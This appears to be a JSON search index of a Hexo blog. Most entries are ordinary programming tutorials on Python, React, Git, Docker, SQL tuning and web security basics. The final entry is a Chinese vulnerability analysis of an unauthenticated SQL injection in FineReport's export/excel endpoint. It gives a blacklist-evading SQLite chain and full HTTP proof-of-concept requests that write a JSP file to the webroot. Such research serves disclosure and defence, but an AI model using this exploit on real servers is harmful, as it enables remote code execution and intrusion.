[{"title":"测试图片显示","url":"/2025/12/31/test-image/","content":"\n这是一个测试图片显示的文章。\n\n![测试图片1](/resources/13464947a8d54db7b6323cc805ecea78.png)\n\n测试完成。\n","tags":["test"],"categories":["测试"]},{"title":"加密测试文章","url":"/2025/12/30/encrypted-test-post/","content":"\n# 这是加密文章的内容\n\n恭喜你成功解密了这篇文章！\n\n## 加密功能测试\n\n这篇文章用于测试 hexo-blog-encrypt 插件的加密功能。\n\n### 功能特点\n\n1. 文章内容在未输入正确密码前不可见\n2. 密码输入界面与暗色主题风格一致\n3. 在文章列表中显示加密标识图标\n4. 支持会话级别的密码记忆\n\n### 代码示例\n\n```javascript\n// 这是一段测试代码\nfunction secretFunction() {\n  console.log('这是加密内容中的代码');\n  return 'secret';\n}\n```\n\n### 结语\n\n如果你能看到这些内容，说明加密和解密功能正常工作！\n","tags":["加密","测试"],"categories":["测试"]},{"title":"Hello World","url":"/2025/12/30/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","tags":["Tutorial","Hexo","Beginner"],"categories":["Getting Started"]},{"title":"JavaScript Basics","url":"/2025/12/29/javascript-basics/","content":"\nThis is a sample post about JavaScript basics.\n\n## Variables\n\nJavaScript has three ways to declare variables:\n\n```javascript\nvar oldWay = 'var is function-scoped';\nlet blockScoped = 'let is block-scoped';\nconst constant = 'const cannot be reassigned';\n```\n\n## Functions\n\nFunctions are first-class citizens in JavaScript:\n\n```javascript\nfunction greet(name) {\n  return `Hello, ${name}!`;\n}\n\nconst arrow = (name) => `Hello, ${name}!`;\n```\n\nStay tuned for more JavaScript tutorials!\n","tags":["Web Development","Tutorial","JavaScript"],"categories":["Programming"]},{"title":"Python Data Structures Guide","url":"/2025/12/28/python-data-structures/","content":"\nA comprehensive guide to Python's built-in data structures.\n\n## Lists\n\nLists are mutable sequences in Python:\n\n```python\n# Creating lists\nfruits = ['apple', 'banana', 'cherry']\nnumbers = [1, 2, 3, 4, 5]\n\n# List operations\nfruits.append('orange')\nfruits.extend(['grape', 'mango'])\nfirst_fruit = fruits[0]\nlast_fruit = fruits[-1]\n\n# List comprehension\nsquares = [x**2 for x in range(10)]\n```\n\n## Dictionaries\n\nDictionaries store key-value pairs:\n\n```python\n# Creating dictionaries\nperson = {\n    'name': 'Alice',\n    'age': 30,\n    'city': 'New York'\n}\n\n# Accessing values\nname = person['name']\nage = person.get('age', 0)\n\n# Dictionary methods\nkeys = person.keys()\nvalues = person.values()\nitems = person.items()\n```\n\n## Sets\n\nSets are unordered collections of unique elements:\n\n```python\n# Creating sets\ncolors = {'red', 'green', 'blue'}\nnumbers = set([1, 2, 2, 3, 3, 4])  # {1, 2, 3, 4}\n\n# Set operations\ncolors.add('yellow')\ncolors.remove('red')\nis_member = 'blue' in colors\n\n# Set operations\nset1 = {1, 2, 3}\nset2 = {3, 4, 5}\nunion = set1 | set2\nintersection = set1 & set2\ndifference = set1 - set2\n```\n\n## Tuples\n\nTuples are immutable sequences:\n\n```python\n# Creating tuples\ncoordinates = (10, 20)\nrgb = (255, 128, 0)\n\n# Tuple unpacking\nx, y = coordinates\nr, g, b = rgb\n\n# Named tuples\nfrom collections import namedtuple\nPoint = namedtuple('Point', ['x', 'y'])\np = Point(10, 20)\nprint(p.x, p.y)\n```\n\nThese data structures form the foundation of Python programming!\n","tags":["Tutorial","Python","Data Structures"],"categories":["Programming","Python"]},{"title":"CSS Flexbox Guide","url":"/2025/12/28/css-flexbox-guide/","content":"\nA comprehensive guide to CSS Flexbox layout.\n\n## What is Flexbox?\n\nFlexbox is a one-dimensional layout method for arranging items in rows or columns.\n\n## Basic Usage\n\n```css\n.container {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n```\n\n## Flex Direction\n\n```css\n.row { flex-direction: row; }\n.column { flex-direction: column; }\n```\n\nFlexbox makes responsive layouts much easier to implement!\n","tags":["CSS","Flexbox","Web Development","Layout"],"categories":["Programming","CSS"]},{"title":"Web Security Best Practices","url":"/2025/12/27/web-security-best-practices/","content":"\nEssential security practices every web developer should follow.\n\n## Input Validation\n\nAlways validate and sanitize user input:\n\n```javascript\n// Bad - vulnerable to XSS\nfunction displayUserInput(input) {\n  document.getElementById('output').innerHTML = input;\n}\n\n// Good - sanitize input\nfunction displayUserInput(input) {\n  const sanitized = input\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n  document.getElementById('output').textContent = sanitized;\n}\n```\n\n## SQL Injection Prevention\n\nUse parameterized queries:\n\n```python\n# Bad - vulnerable to SQL injection\ndef get_user(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    return db.execute(query)\n\n# Good - use parameterized queries\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE username = ?\"\n    return db.execute(query, (username,))\n```\n\n## Password Security\n\nHash passwords properly:\n\n```python\nimport bcrypt\n\n# Hashing a password\ndef hash_password(password):\n    salt = bcrypt.gensalt()\n    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)\n    return hashed\n\n# Verifying a password\ndef verify_password(password, hashed):\n    return bcrypt.checkpw(password.encode('utf-8'), hashed)\n```\n\n## HTTPS and Secure Headers\n\nAlways use HTTPS and set security headers:\n\n```javascript\n// Express.js example\nconst helmet = require('helmet');\napp.use(helmet());\n\n// Set custom headers\napp.use((req, res, next) => {\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n  next();\n});\n```\n\n## CSRF Protection\n\nImplement CSRF tokens:\n\n```javascript\n// Generate CSRF token\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get('/form', csrfProtection, (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\napp.post('/process', csrfProtection, (req, res) => {\n  // Process form\n});\n```\n\nSecurity is not optional - make it a priority from day one!\n","tags":["Web Development","Best Practices","Security"],"categories":["Security","Web Development"]},{"title":"Docker Containerization Guide","url":"/2025/12/26/docker-containerization-guide/","content":"\nLearn how to containerize your applications with Docker.\n\n## What is Docker?\n\nDocker is a platform for developing, shipping, and running applications in containers. Containers package your application with all its dependencies.\n\n## Basic Dockerfile\n\nCreate a Dockerfile for a Node.js application:\n\n```dockerfile\n# Use official Node.js runtime\nFROM node:18-alpine\n\n# Set working directory\nWORKDIR /app\n\n# Copy package files\nCOPY package*.json ./\n\n# Install dependencies\nRUN npm ci --only=production\n\n# Copy application code\nCOPY . .\n\n# Expose port\nEXPOSE 3000\n\n# Set user for security\nUSER node\n\n# Start application\nCMD [\"node\", \"server.js\"]\n```\n\n## Docker Compose\n\nOrchestrate multiple containers:\n\n```yaml\nversion: '3.8'\n\nservices:\n  web:\n    build: .\n    ports:\n      - \"3000:3000\"\n    environment:\n      - NODE_ENV=production\n      - DATABASE_URL=postgres://db:5432/myapp\n    depends_on:\n      - db\n    volumes:\n      - ./logs:/app/logs\n\n  db:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=myapp\n      - POSTGRES_USER=admin\n      - POSTGRES_PASSWORD=secret\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n\nvolumes:\n  postgres_data:\n```\n\n## Common Docker Commands\n\n```bash\n# Build an image\ndocker build -t myapp:latest .\n\n# Run a container\ndocker run -d -p 3000:3000 --name myapp myapp:latest\n\n# View running containers\ndocker ps\n\n# View logs\ndocker logs myapp\n\n# Execute command in container\ndocker exec -it myapp sh\n\n# Stop and remove container\ndocker stop myapp\ndocker rm myapp\n\n# Remove image\ndocker rmi myapp:latest\n```\n\n## Multi-stage Builds\n\nOptimize image size with multi-stage builds:\n\n```dockerfile\n# Build stage\nFROM node:18 AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n# Production stage\nFROM node:18-alpine\nWORKDIR /app\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY package*.json ./\nEXPOSE 3000\nUSER node\nCMD [\"node\", \"dist/server.js\"]\n```\n\n## Best Practices\n\n1. **Use official base images** - Start with trusted images\n2. **Minimize layers** - Combine RUN commands when possible\n3. **Use .dockerignore** - Exclude unnecessary files\n4. **Don't run as root** - Use USER directive\n5. **Keep images small** - Use alpine variants\n6. **Pin versions** - Specify exact image versions\n\nDocker makes deployment consistent and reliable across environments!\n","tags":["Docker","Containers","DevOps","Tutorial"],"categories":["DevOps","Docker"]},{"title":"React Hooks Explained","url":"/2025/12/25/react-hooks-explained/","content":"\nA comprehensive guide to React Hooks and how to use them effectively.\n\n## useState Hook\n\nManage component state:\n\n```javascript\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>\n        Increment\n      </button>\n      <button onClick={() => setCount(count - 1)}>\n        Decrement\n      </button>\n    </div>\n  );\n}\n```\n\n## useEffect Hook\n\nHandle side effects:\n\n```javascript\nimport { useState, useEffect } from 'react';\n\nfunction UserProfile({ userId }) {\n  const [user, setUser] = useState(null);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    // Fetch user data\n    async function fetchUser() {\n      setLoading(true);\n      const response = await fetch(`/api/users/${userId}`);\n      const data = await response.json();\n      setUser(data);\n      setLoading(false);\n    }\n\n    fetchUser();\n\n    // Cleanup function\n    return () => {\n      // Cancel any pending requests\n    };\n  }, [userId]); // Re-run when userId changes\n\n  if (loading) return <div>Loading...</div>;\n  return <div>{user.name}</div>;\n}\n```\n\n## useContext Hook\n\nAccess context values:\n\n```javascript\nimport { createContext, useContext, useState } from 'react';\n\nconst ThemeContext = createContext();\n\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n\n  return (\n    <ThemeContext.Provider value={{ theme, setTheme }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\nfunction ThemedButton() {\n  const { theme, setTheme } = useContext(ThemeContext);\n\n  return (\n    <button\n      style={{\n        background: theme === 'light' ? '#fff' : '#333',\n        color: theme === 'light' ? '#333' : '#fff'\n      }}\n      onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}\n    >\n      Toggle Theme\n    </button>\n  );\n}\n```\n\n## useReducer Hook\n\nManage complex state logic:\n\n```javascript\nimport { useReducer } from 'react';\n\nconst initialState = { count: 0 };\n\nfunction reducer(state, action) {\n  switch (action.type) {\n    case 'increment':\n      return { count: state.count + 1 };\n    case 'decrement':\n      return { count: state.count - 1 };\n    case 'reset':\n      return initialState;\n    default:\n      throw new Error();\n  }\n}\n\nfunction Counter() {\n  const [state, dispatch] = useReducer(reducer, initialState);\n\n  return (\n    <div>\n      <p>Count: {state.count}</p>\n      <button onClick={() => dispatch({ type: 'increment' })}>+</button>\n      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>\n      <button onClick={() => dispatch({ type: 'reset' })}>Reset</button>\n    </div>\n  );\n}\n```\n\n## Custom Hooks\n\nCreate reusable logic:\n\n```javascript\nimport { useState, useEffect } from 'react';\n\nfunction useLocalStorage(key, initialValue) {\n  const [value, setValue] = useState(() => {\n    const stored = localStorage.getItem(key);\n    return stored ? JSON.parse(stored) : initialValue;\n  });\n\n  useEffect(() => {\n    localStorage.setItem(key, JSON.stringify(value));\n  }, [key, value]);\n\n  return [value, setValue];\n}\n\n// Usage\nfunction App() {\n  const [name, setName] = useLocalStorage('name', '');\n\n  return (\n    <input\n      value={name}\n      onChange={(e) => setName(e.target.value)}\n      placeholder=\"Enter your name\"\n    />\n  );\n}\n```\n\nHooks make React components more powerful and easier to understand!\n","tags":["Tutorial","React","JavaScript","Frontend"],"categories":["Programming","Frontend"]},{"title":"Git Workflow Tips and Tricks","url":"/2025/12/24/git-workflow-tips/","content":"\nMaster Git with these essential workflow tips and commands.\n\n## Branch Management\n\nCreate and manage branches effectively:\n\n```bash\n# Create and switch to new branch\ngit checkout -b feature/new-feature\n\n# List all branches\ngit branch -a\n\n# Delete local branch\ngit branch -d feature/old-feature\n\n# Delete remote branch\ngit push origin --delete feature/old-feature\n\n# Rename current branch\ngit branch -m new-branch-name\n```\n\n## Commit Best Practices\n\nWrite meaningful commit messages:\n\n```bash\n# Good commit message format\ngit commit -m \"feat: add user authentication\n\n- Implement JWT token generation\n- Add login and logout endpoints\n- Create user session middleware\"\n\n# Amend last commit\ngit commit --amend\n\n# Interactive staging\ngit add -p\n```\n\n## Stashing Changes\n\nSave work in progress:\n\n```bash\n# Stash current changes\ngit stash save \"WIP: working on feature X\"\n\n# List all stashes\ngit stash list\n\n# Apply most recent stash\ngit stash apply\n\n# Apply and remove stash\ngit stash pop\n\n# Apply specific stash\ngit stash apply stash@{2}\n\n# Clear all stashes\ngit stash clear\n```\n\n## Rebase vs Merge\n\nKeep history clean with rebase:\n\n```bash\n# Update feature branch with main\ngit checkout feature/my-feature\ngit rebase main\n\n# Interactive rebase to clean up commits\ngit rebase -i HEAD~3\n\n# Continue after resolving conflicts\ngit rebase --continue\n\n# Abort rebase\ngit rebase --abort\n```\n\n## Useful Aliases\n\nAdd these to your `.gitconfig`:\n\n```ini\n[alias]\n  st = status\n  co = checkout\n  br = branch\n  ci = commit\n  unstage = reset HEAD --\n  last = log -1 HEAD\n  visual = log --graph --oneline --all\n  amend = commit --amend --no-edit\n```\n\n## Cherry-picking\n\nApply specific commits:\n\n```bash\n# Cherry-pick a commit\ngit cherry-pick abc123\n\n# Cherry-pick multiple commits\ngit cherry-pick abc123 def456\n\n# Cherry-pick without committing\ngit cherry-pick -n abc123\n```\n\n## Undoing Changes\n\nFix mistakes safely:\n\n```bash\n# Undo last commit (keep changes)\ngit reset --soft HEAD~1\n\n# Undo last commit (discard changes)\ngit reset --hard HEAD~1\n\n# Revert a commit (create new commit)\ngit revert abc123\n\n# Discard local changes\ngit checkout -- filename\ngit restore filename\n```\n\n## Working with Remotes\n\nManage remote repositories:\n\n```bash\n# Add remote\ngit remote add upstream https://github.com/original/repo.git\n\n# Fetch from remote\ngit fetch upstream\n\n# Pull with rebase\ngit pull --rebase origin main\n\n# Push force safely\ngit push --force-with-lease\n```\n\nThese Git techniques will make you more productive and confident!\n","tags":["Git","Version Control","Best Practices"],"categories":["DevOps","Version Control"]},{"title":"Private Development Notes","url":"/2025/12/23/private-notes/","content":"\n# Private Development Notes\n\nThis is a password-protected article containing sensitive information.\n\n## Project Architecture Decisions\n\nWe decided to use microservices architecture for the following reasons:\n\n1. **Scalability** - Each service can scale independently\n2. **Maintainability** - Smaller codebases are easier to manage\n3. **Technology flexibility** - Different services can use different tech stacks\n\n## API Keys and Configuration\n\n```bash\n# Development environment\nDATABASE_URL=postgresql://localhost:5432/devdb\nREDIS_URL=redis://localhost:6379\nAPI_KEY=dev_key_12345\n\n# Production environment\nDATABASE_URL=postgresql://prod-server:5432/proddb\nREDIS_URL=redis://prod-cache:6379\nAPI_KEY=prod_key_67890\n```\n\n## Performance Optimization Notes\n\n- Implemented Redis caching for frequently accessed data\n- Added database indexes on user_id and created_at columns\n- Optimized N+1 queries using eager loading\n- Reduced bundle size by 40% with code splitting\n\n## Security Considerations\n\n- All API endpoints require authentication\n- Implemented rate limiting (100 requests per minute)\n- Using bcrypt for password hashing with cost factor 12\n- HTTPS enforced on all production endpoints\n\n## Future Improvements\n\n1. Implement GraphQL API\n2. Add real-time notifications with WebSockets\n3. Migrate to Kubernetes for orchestration\n4. Set up automated testing pipeline\n\nThese notes are for internal reference only.\n","tags":["Private","Notes"],"categories":["Personal"]},{"title":"Database Optimization Techniques","url":"/2025/12/22/database-optimization-techniques/","content":"\nEssential techniques for optimizing database performance and query efficiency.\n\n## Indexing Strategies\n\nProper indexing is crucial for query performance:\n\n```sql\n-- Create single column index\nCREATE INDEX idx_users_email ON users(email);\n\n-- Create composite index\nCREATE INDEX idx_orders_user_date ON orders(user_id, created_at);\n\n-- Create unique index\nCREATE UNIQUE INDEX idx_users_username ON users(username);\n\n-- Create partial index (PostgreSQL)\nCREATE INDEX idx_active_users ON users(email) WHERE active = true;\n\n-- View existing indexes\nSELECT * FROM pg_indexes WHERE tablename = 'users';\n```\n\n## Query Optimization\n\nWrite efficient queries:\n\n```sql\n-- Bad: Using SELECT *\nSELECT * FROM users WHERE id = 1;\n\n-- Good: Select only needed columns\nSELECT id, name, email FROM users WHERE id = 1;\n\n-- Bad: Using OR with different columns\nSELECT * FROM products WHERE category = 'electronics' OR price < 100;\n\n-- Good: Use UNION for OR conditions on different columns\nSELECT * FROM products WHERE category = 'electronics'\nUNION\nSELECT * FROM products WHERE price < 100;\n\n-- Use EXPLAIN to analyze queries\nEXPLAIN ANALYZE\nSELECT u.name, COUNT(o.id) as order_count\nFROM users u\nLEFT JOIN orders o ON u.id = o.user_id\nGROUP BY u.id, u.name;\n```\n\n## Avoiding N+1 Queries\n\nUse eager loading to prevent N+1 problems:\n\n```python\n# Bad: N+1 query problem\nusers = User.query.all()\nfor user in users:\n    print(user.orders)  # Separate query for each user\n\n# Good: Eager loading\nfrom sqlalchemy.orm import joinedload\n\nusers = User.query.options(joinedload(User.orders)).all()\nfor user in users:\n    print(user.orders)  # No additional queries\n```\n\n## Connection Pooling\n\nReuse database connections:\n\n```javascript\n// Node.js with pg-pool\nconst { Pool } = require('pg');\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'mydb',\n  max: 20,                // Maximum connections\n  idleTimeoutMillis: 30000,\n  connectionTimeoutMillis: 2000,\n});\n\n// Use pool for queries\nasync function getUser(id) {\n  const client = await pool.connect();\n  try {\n    const result = await client.query(\n      'SELECT * FROM users WHERE id = $1',\n      [id]\n    );\n    return result.rows[0];\n  } finally {\n    client.release();\n  }\n}\n```\n\n## Caching Strategies\n\nImplement caching to reduce database load:\n\n```python\nimport redis\nimport json\n\nredis_client = redis.Redis(host='localhost', port=6379, db=0)\n\ndef get_user(user_id):\n    # Try cache first\n    cache_key = f'user:{user_id}'\n    cached = redis_client.get(cache_key)\n    \n    if cached:\n        return json.loads(cached)\n    \n    # Query database if not in cache\n    user = db.query(User).filter(User.id == user_id).first()\n    \n    # Store in cache for 1 hour\n    redis_client.setex(\n        cache_key,\n        3600,\n        json.dumps(user.to_dict())\n    )\n    \n    return user\n```\n\n## Batch Operations\n\nProcess multiple records efficiently:\n\n```sql\n-- Bad: Multiple individual inserts\nINSERT INTO users (name, email) VALUES ('Alice', 'alice@example.com');\nINSERT INTO users (name, email) VALUES ('Bob', 'bob@example.com');\nINSERT INTO users (name, email) VALUES ('Charlie', 'charlie@example.com');\n\n-- Good: Batch insert\nINSERT INTO users (name, email) VALUES\n  ('Alice', 'alice@example.com'),\n  ('Bob', 'bob@example.com'),\n  ('Charlie', 'charlie@example.com');\n\n-- Batch update\nUPDATE users\nSET status = 'active'\nWHERE id IN (1, 2, 3, 4, 5);\n```\n\n## Partitioning\n\nSplit large tables for better performance:\n\n```sql\n-- Create partitioned table (PostgreSQL)\nCREATE TABLE orders (\n    id SERIAL,\n    user_id INTEGER,\n    created_at TIMESTAMP,\n    total DECIMAL\n) PARTITION BY RANGE (created_at);\n\n-- Create partitions\nCREATE TABLE orders_2024 PARTITION OF orders\n    FOR VALUES FROM ('2024-01-01') TO ('2025-01-01');\n\nCREATE TABLE orders_2025 PARTITION OF orders\n    FOR VALUES FROM ('2025-01-01') TO ('2026-01-01');\n```\n\n## Monitoring and Analysis\n\nTrack query performance:\n\n```sql\n-- Enable query logging (PostgreSQL)\nALTER SYSTEM SET log_min_duration_statement = 1000; -- Log queries > 1s\n\n-- Find slow queries\nSELECT query, calls, total_time, mean_time\nFROM pg_stat_statements\nORDER BY mean_time DESC\nLIMIT 10;\n\n-- Check table sizes\nSELECT\n    schemaname,\n    tablename,\n    pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) AS size\nFROM pg_tables\nORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;\n```\n\nOptimize your database for better application performance!\n","tags":["Database","SQL","Performance","Optimization"],"categories":["Database","Performance"]},{"title":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞","url":"/2025/06/30/帆软FineReport-Export-excel-未授权SQL注入致远程代码执行漏洞/","content":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞\n\n官方给的接口是 export/excel，且说了问题出在 LargedsExcelExport 这个模块里，帆软v11 web 端架构并不复杂，可通过注解 `@RequestMapping` 快速锁定相关路由。用 Jadx 搜一下，发现大部分路由都位于`com.fr.nx.app.web.controller.NXController`。\n\n<img src=\"/resources/13464947a8d54db7b6323cc805ecea78.png\" alt=\"d1986651344e1a603a92f8f2e9e23c27.png\" width=\"774\" height=\"306\">\n\n跟进到`com.fr.nx.app.web.controller.NXController#largedsExcelExportV9`，重点关注初始化方法`initCreator`。\n\n![254aa8d33b3366955492da97c3569b2d.png](/resources/e0a12bf8ed824dc0ba2a1b45bd39f56c.png)\n\n首先获取一个参数`__parameters__`，这个参数不关键，默认为{}。\n\n之后会进入`getEntity`方法，该方法需要读取第二个参数`params`，然后通过`createXMLableReader`方法自定义一个xml格式数据来还原对象。\n\n<img src=\"/resources/180b13b91af64bfc898e36a8fa084513.png\" alt=\"feb5184c9bc7bbb32f4c56a958ee4be4.png\" width=\"731\" height=\"263\">\n\n仿照其构造一个，格式如下：\n\n![bbc6cf5ded3f8b6edb4ded56d0a1cf54.png](/resources/01d3b5d50727422699e76a99b85ba49e.png)\n\n回到`getEntity`方法，程序继续执行会进入`dealParam`。\n\n![10d1648b0baf4743d18336b64b699916.png](/resources/0b164bd922534eea80ecc92882c5cf6a.png)\n\n这里需要第三个参数`functionParams`，同样默认为json。这里着重注意下，传入的`LargeDatasetExcelExportJavaScript`类型变量获取了其中`<Parameters>`下的每一个`<Parameter>`，执行了`var25 = var2.evalValue(String.valueOf(var17.getValue()));`操作。\n\n这个方法不是第一次爆洞了，简单来说就是其中可以执行帆软定义的一些函数。而帆软报表默认使用Sqlite作为数据库引擎，并且默认存在数据库FRDemo，因此可以执行SQL语句。\n\n![c53fdfe0f633ce998219e4208191c8d5.png](/resources/663baf5273c3433f8630f63aadd301b7.png)\n\n在执行SQL前，会调用`JDBCSecurityChecker.checkQuery`方法对SQL进行安全检查。跟进`checkQuery`方法，该方法做了一个黑名单检测，如果匹配到`InsecurityElement`对应的关键字，则报错退出。\n\n![24914a06c571d240990bf19d4cdcc311.png](/resources/6a962ebb2b14418b95342155cac2086f.png)\n\n也就是说，现在需要绕过SQL安全检测限制并实现webshell落地，目前已知可用的SQL注入路径如下：（由于默认的数据库里数据太多写入的shell无法解析，所以我们要先清空FRDemo数据库）：\n\n```sql\nPRAGMA writable_schema=ON;\nDELETE FROM sqlite_schema WHERE name='sqlite_stat1';\nANALYZE;\nREPLACE INTO sqlite_stat1 VALUES ('', '<JSP_PAYLOAD>', '');\nVACUUM INTO (ENV_HOME/../../92ccC9AC.jsp);\n```\n\nPOC如下：\n\n```\nGET /webroot/ReportServer?viewlets=[{'reportlet':'/'}] HTTP/1.1\nHost: 10.211.55.3:8075\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nop: getSessionID\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n\n```\n\n```\nGET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%7D&__parameters__=%7B%7D HTTP/1.1\nHost: 10.211.55.3:8075\nAccept-Encoding: gzip, deflate\nAccept: */*\nsessionID: 118b5fb1-596e-45cb-93b0-692ceb30641e\nparams: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27%3C%25+out.println%28new+String%28new+sun.misc.BASE64Decoder%28%29.decodeBuffer%28%5C%22Zjc5NjUxODQ4NDAyY2JmZmI3MWNmNGMwYWYyNzU0NzE%3D%5C%22%29%29%29%3B+new+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B+%25%3E%22%2C%22%27%22%2C%22%2C%27%27%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%2292ccC9AC%22%2C%22.%22%2C%22j%22%2C%22s%22%2C%22p%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E\n```\n\n![abf87ef9964f396b3ab50677399b690e.png](/resources/e8c4e39e2c6b44f2a21c70dda2db8f17.png)","tags":["Java","vulnerability"],"categories":["漏洞分析"]}]